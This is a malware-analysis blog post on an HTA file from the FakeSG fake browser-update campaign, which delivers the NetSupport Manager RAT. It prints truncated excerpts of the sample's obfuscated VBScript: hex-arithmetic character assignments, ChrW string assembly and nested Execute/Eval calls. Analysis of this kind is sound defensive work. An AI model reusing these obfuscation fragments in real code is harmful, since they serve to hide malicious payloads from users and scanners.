---
layout: post
title:  "Analyzing FakeSG Malware Campaign Sample"
date:   2023-09-12 00:00:00 +0000
categories: malware
---

### 1. Campaign
FakeSG is an ongoing malware campaign (as of 12 Sep 2023). The campaign aims to compromise websites, which imitate the victim's browser update page - prompting the user to install and execute a malicious file.

The FakeSG campaign is known for its heavy obfuscation and payload delivery tactics - opting to HTML Applications `(.hta)` files to ultimately deliver the [NetSupport Manager RAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.netsupportmanager_rat). [(Source)] (https://www.pcrisk.com/removal-guides/27315-fakesg-malware).

In this blog entry, we will analyze a `.hta` instance from the campaign


<br>
### 2. Obfuscation
Here's a snippet of the embedded VBScript in the `.hta` document. The obfuscation consists of 3 main parts.

A brief explanation of VBScript syntax:
+ `:` separates the next command, like `;` in most other languages.
+ `=` denotes variable assignment.
+ `&H` denotes a hexadecimal number. (`&H10` equals decimal 16).
+ `ChrW()` converts decimal numbers into unicode characters.
+ `&` concatenates strings together.

{% highlight vbscript %}
<script language="vBsCrIPt">

a70=574 - &H1F8:a117=872 - &H2F3:a110=932 - &H336:a99=711 - &H264:a116=679 - &H233:a105=980 - &H36B:a111=255 - &H90:a110=582 - &H1D8:a32=390 - &H166:a66=684 - &H26A:a99=926 - &H33B:a100=642 - &H21E:a40=925 - &H375:a66=955 - &H379:a121=707 - &H24A:a86=809 - &H2D3:a97=1071 - &H3CE:a108=814 - &H2C2:a32=965 - &H3A5:a71=269 - &HC6:a68=183 - &H73:a66=258 - &HC0:a41=307 - &H10A:a13=994 - &H3D5:a10=241 - &HE7:a32=633 - &H259:a32=320 - &H120:a32=815 - &H30F:a32=265 - &HE9:a32=530 - &H1F2:a32=964 - &H3A4:a32=571 - &H21B:a32=932 - &H384:a32=614 - &H246:a32=320 - &H120:a32=605 - &H23D:a32=394 - &H16A:a32=334 - &H12E:a32=980 - &H3B4:a32=598 - &H236:a32=293 - &H105:a32=874 - &H34A:a32=452 - &H1A4:a32=764 - &H2DC:a68=669 - &H259:a105=755 - &H28A:a109=1095 - &H3DA:a32=840 - &H328:a120=335 - &HD7:a100=585 - &H1E5:a113=1018 - &H389:a13=492 - &H1DF:a10=683 - &H2A1:a32=758 - &H2D6:a32=619 - &H24B:a32=443 - &H19B:a32=620 - &H24C:a32=871 - &H347:a32=513 - &H1E1:a32=992 - &H3C0:a32=719 - &
...
...
res =  ChrW ( a70 ) & ChrW ( a117 ) & ChrW ( a110 ) & ChrW ( a99 ) & ChrW ( a116 ) & ChrW ( a105 ) & ChrW ( a111 ) & ChrW ( a110 ) & ChrW ( a32 ) & ChrW ( a66 ) & ChrW ( a99 ) & ChrW ( a100 ) & ChrW ( a40 ) & ChrW ( a66 ) & ChrW ( a121 ) & ChrW ( a86 ) & ChrW ( a97 ) & ChrW ( a108 ) & ChrW ( a32 ) & ChrW ( a71 ) & ChrW ( a68 ) & ChrW ( a66 ) & ChrW ( a41 ) & ChrW ( a13 ) & ChrW ( a10 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a68 ) & ChrW ( a105 ) & ChrW ( a109 ) & ChrW ( a32 ) & ChrW ( a120 ) & ChrW ( a100 ) & ChrW ( a113 ) & ChrW ( a13 ) & ChrW ( a10 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( a32 ) & ChrW ( 
...
...
Execute Eval("Eval(""Eval(""""Eval(""""""""Eval(""""""""""""""""Eval(""""""""""""""""""""""""""""""""Eval(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""Eval(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""Eval(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""Eval(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""Eval
...
...

Close
</script>
{% endhighlight %}



<br>
### 2. Obfuscation